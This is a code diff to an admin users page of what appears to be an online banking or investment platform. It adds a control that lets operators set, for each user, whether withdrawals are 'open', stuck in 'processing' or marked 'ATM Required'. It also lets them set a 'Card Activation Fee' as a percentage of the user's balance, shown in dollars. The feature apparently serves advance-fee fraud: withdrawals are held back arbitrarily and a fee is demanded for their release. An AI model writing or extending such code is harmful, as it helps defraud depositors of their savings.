@@ -5,12 +5,13 @@ import {
   Search, X, CheckCircle, XCircle, Clock, ShieldCheck, DollarSign,
   ChevronDown, ChevronUp, Plus, Minus, Eye, RefreshCw, AlertCircle,
   User, Phone, MapPin, Calendar, Hash, TrendingUp, TrendingDown,
+  CreditCard, Unlock, Loader,
 } from "lucide-react"
 import AdminShell from "@/components/admin/admin-shell"
 import {
   adminGetAllUsers, adminGetUserTransactions, adminUpdateVerificationStatus,
-  adminCreditUser, adminDebitUser,
-  type DBProfile, type DBTransaction, type VerificationStatus,
+  adminCreditUser, adminDebitUser, adminSetWithdrawalScreen,
+  type DBProfile, type DBTransaction, type VerificationStatus, type WithdrawalScreen,
 } from "@/lib/supabase/admin"
 import { sendCreditEmail, sendDebitEmail } from "@/lib/send-email-client"
 import { formatCurrency } from "@/lib/currency"
@@ -38,11 +39,24 @@ export default function AdminUsersPage() {
   const [feedback, setFeedback]         = useState<Record<string, { msg: string; ok: boolean }>>({})
   const [actionLoading, setActionLoading] = useState<Record<string, boolean>>({})
 
+  // Per-user withdrawal screen state
+  const [wdScreen,  setWdScreen]  = useState<Record<string, WithdrawalScreen>>({})
+  const [wdFeePct,  setWdFeePct]  = useState<Record<string, string>>({})
+
   const loadUsers = useCallback(async () => {
     setLoading(true); setError(null)
     try {
       const data = await adminGetAllUsers()
       setUsers(data)
+      // Initialise withdrawal screen local state from DB values
+      const screens: Record<string, WithdrawalScreen> = {}
+      const fees:    Record<string, string>            = {}
+      data.forEach(u => {
+        screens[u.id] = u.withdrawal_screen ?? "processing"
+        fees[u.id]    = String(u.withdrawal_fee_pct ?? 10)
+      })
+      setWdScreen(screens)
+      setWdFeePct(fees)
     } catch (e: any) {
       setError(e.message ?? "Failed to load users")
     } finally {
@@ -150,6 +164,29 @@ export default function AdminUsersPage() {
       showFeedback(userId, e.message ?? "Update failed.", false)
     } finally {
       setActionLoading(p => ({ ...p, [userId]: false }))
+    }
+  }
+
+  const handleWithdrawalScreen = async (userId: string) => {
+    const screen = wdScreen[userId] ?? "processing"
+    const fee    = parseFloat(wdFeePct[userId] ?? "10")
+    if (isNaN(fee) || fee < 0 || fee > 100) {
+      showFeedback(userId, "Fee must be between 0 and 100.", false)
+      return
+    }
+    setActionLoading(p => ({ ...p, [`wd-${userId}`]: true }))
+    try {
+      await adminSetWithdrawalScreen(userId, screen, fee)
+      setUsers(prev => prev.map(u =>
+        u.id === userId
+          ? { ...u, withdrawal_screen: screen, withdrawal_fee_pct: fee }
+          : u
+      ))
+      showFeedback(userId, `Withdrawal screen set to "${screen}" with ${fee}% fee.`, true)
+    } catch (e: any) {
+      showFeedback(userId, e.message ?? "Failed to update.", false)
+    } finally {
+      setActionLoading(p => ({ ...p, [`wd-${userId}`]: false }))
     }
   }
 
@@ -358,6 +395,106 @@ export default function AdminUsersPage() {
                             ))}
                           </div>
                         </div>
+                      </div>
+
+                      {/* ── Withdrawal Screen Control ─────────────────────── */}
+                      <div className="bg-white border-2 border-[#1a6fad]/20 rounded-xl p-4">
+                        {/* Panel header */}
+                        <div className="flex items-center justify-between mb-1">
+                          <p className="text-sm font-bold text-[#0c2d4e] flex items-center gap-2">
+                            <CreditCard size={15} className="text-[#1a6fad]" />
+                            Withdrawal &amp; Transfer Screen
+                          </p>
+                          {/* Live badge showing current DB value */}
+                          <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${
+                            (user.withdrawal_screen ?? "processing") === "open"
+                              ? "bg-green-100 text-green-700"
+                              : (user.withdrawal_screen ?? "processing") === "atm_required"
+                              ? "bg-red-100 text-red-600"
+                              : "bg-amber-100 text-amber-700"
+                          }`}>
+                            {(user.withdrawal_screen ?? "processing") === "open"
+                              ? "Open"
+                              : (user.withdrawal_screen ?? "processing") === "atm_required"
+                              ? "ATM Required"
+                              : "Processing"}
+                          </span>
+                        </div>
+                        <p className="text-xs text-[#94a3b8] mb-4">
+                          Controls what the user sees when they visit Withdraw or Transfer.
+                        </p>
+
+                        {/* Screen selector */}
+                        <div className="grid grid-cols-3 gap-2 mb-4">
+                          {([
+                            { val: "open",         label: "Open",         sub: "Normal flow",        ring: "border-[#0e9483] bg-green-50",  text: "text-[#0e9483]" },
+                            { val: "processing",   label: "Processing",   sub: "Activation pending", ring: "border-amber-400 bg-amber-50",   text: "text-amber-700" },
+                            { val: "atm_required", label: "ATM Required", sub: "Card required",      ring: "border-red-400 bg-red-50",       text: "text-red-600" },
+                          ] as { val: WithdrawalScreen; label: string; sub: string; ring: string; text: string }[]).map(opt => {
+                            const active = (wdScreen[user.id] ?? "processing") === opt.val
+                            return (
+                              <button
+                                key={opt.val}
+                                onClick={() => setWdScreen(p => ({ ...p, [user.id]: opt.val }))}
+                                className={`flex flex-col items-center gap-0.5 py-2.5 px-2 rounded-xl border-2 text-center transition-all ${
+                                  active ? `${opt.ring} ${opt.text}` : "border-[#e2e8f0] text-[#94a3b8] hover:border-[#c4d4e0]"
+                                }`}
+                              >
+                                {opt.val === "open" && <Unlock size={13} />}
+                                {opt.val === "processing" && <Clock size={13} />}
+                                {opt.val === "atm_required" && <CreditCard size={13} />}
+                                <span className="text-[10px] font-bold leading-tight">{opt.label}</span>
+                                <span className="text-[9px] opacity-70 leading-tight">{opt.sub}</span>
+                              </button>
+                            )
+                          })}
+                        </div>
+
+                        {/* Fee % — only shown when atm_required selected */}
+                        {(wdScreen[user.id] ?? "processing") === "atm_required" && (
+                          <div className="mb-4 animate-fade-in">
+                            <label className="block text-xs font-bold text-[#334155] mb-1.5">
+                              Card Activation Fee (% of balance)
+                            </label>
+                            <div className="relative">
+                              <input
+                                type="number"
+                                min="0"
+                                max="100"
+                                step="0.5"
+                                value={wdFeePct[user.id] ?? "10"}
+                                onChange={e => setWdFeePct(p => ({ ...p, [user.id]: e.target.value }))}
+                                className="w-full pl-4 pr-8 py-2.5 border border-[#e2e8f0] rounded-xl text-sm outline-none focus:border-[#1a6fad] focus:ring-2 focus:ring-[#1a6fad]/20"
+                                placeholder="10"
+                              />
+                              <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[#94a3b8] text-sm font-bold">%</span>
+                            </div>
+                            {(() => {
+                              const bal = Number(user.balance)
+                              const pct = parseFloat(wdFeePct[user.id] ?? "10")
+                              const fee = isNaN(pct) ? 0 : +((bal * pct) / 100).toFixed(2)
+                              return (
+                                <p className="text-xs text-[#64748b] mt-1.5">
+                                  Fee on current balance:{" "}
+                                  <strong className="text-red-600">
+                                    ${fee.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+                                  </strong>
+                                </p>
+                              )
+                            })()}
+                          </div>
+                        )}
+
+                        {/* Save button */}
+                        <button
+                          onClick={() => handleWithdrawalScreen(user.id)}
+                          disabled={!!actionLoading[`wd-${user.id}`]}
+                          className="w-full flex items-center justify-center gap-2 bg-[#0c2d4e] hover:bg-[#1a4a72] disabled:opacity-50 text-white text-xs font-bold py-2.5 rounded-xl transition-all btn-press"
+                        >
+                          {actionLoading[`wd-${user.id}`]
+                            ? <><Loader size={13} className="animate-spin" /> Saving…</>
+                            : "Apply Withdrawal Screen"}
+                        </button>
                       </div>
 
                       {/* Feedback */}
